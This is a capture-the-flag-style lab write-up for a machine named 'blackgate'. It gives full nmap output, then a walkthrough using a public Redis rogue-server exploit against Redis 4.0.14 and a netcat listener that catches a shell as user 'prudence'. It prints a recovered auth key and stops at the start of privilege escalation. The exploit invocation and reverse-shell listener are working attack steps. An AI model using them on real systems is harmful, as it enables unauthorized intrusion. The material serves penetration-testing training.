# Introduction

This lab leverages an insecure Redis service to gain initial shell access by deploying a rogue server exploit for remote code execution. Privilege escalation is achieved by exploiting a vulnerable redis-status binary using Return Oriented Programming (ROP) to bypass protections and execute arbitrary commands as root. 
# Objective

- Enumerate open services to identify the Redis server.
- Deploy a rogue Redis server exploit to gain initial access.
- Analyze the redis-status binary to identify a buffer overflow vulnerability.
- Gain root access through privilege escalation

# Information Gathering 

Nmap Scan:

	nmap -sC -sV -v -p- 192.168.155.176

tarting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 11:59 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Initiating NSE at 11:59
Completed NSE at 11:59, 0.00s elapsed
Initiating Ping Scan at 11:59
Scanning 192.168.155.176 [4 ports]
Completed Ping Scan at 11:59, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:59
Scanning blackgate (192.168.155.176) [65535 ports]
Discovered open port 22/tcp on 192.168.155.176
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.11% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.28% done; ETC: 12:00 (0:01:26 remaining)
Discovered open port 6379/tcp on 192.168.155.176
Completed SYN Stealth Scan at 12:00, 52.48s elapsed (65535 total ports)
Initiating Service scan at 12:00
Scanning 2 services on blackgate (192.168.155.176)
Completed Service scan at 12:00, 6.14s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.155.176.
Initiating NSE at 12:00
Completed NSE at 12:00, 2.77s elapsed
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
Nmap scan report for blackgate (192.168.155.176)
Host is up (0.051s latency).
Not shown: 65435 closed tcp ports (reset), 98 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Available ports ==22, 6739==

No available access directly in web browser for the target IP address. 

Adding IP to /etc/hosts:

	echo 192.168.155.176 blackgate | sudo tee -a /etc/hosts

Still no visibility on open ports after adding the IP address. 

Let's look into the available service running on port 6379.

Port 6379 appears to be running the Redis service with version 4.0.14. Redis (Remote Dictionary Service) is an open source key/value store used primarily by application caches and databases.

# Service Enumeration

With research, we are able to find an available GitHub that exploits a vulnerability in the Redis servers running version < 5. 

We will use the exploit by [n0b0dy](https://github.com/n0b0dyCN)

Exploit link -> https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de-----------------------------------------

After reading the usage rule son Gitlab and preparing the required software, we can run the exploit:

	python ./redis-rogue-server.py --rhost 192.168.155.176 --rport 6379 --lhost 192.168.45.209 --lport 80

On a separate Linux shell we set up a remote listener to catch the server redirection:

	nc -lvnp 80

With success, we get a connection to our listener on port 80 and are logged in as the user, "prudence"
# Privilege Escalation

Auth Key found in the /usr/...redis-status file:

ClimbingParrotKickingDonkey321
ls
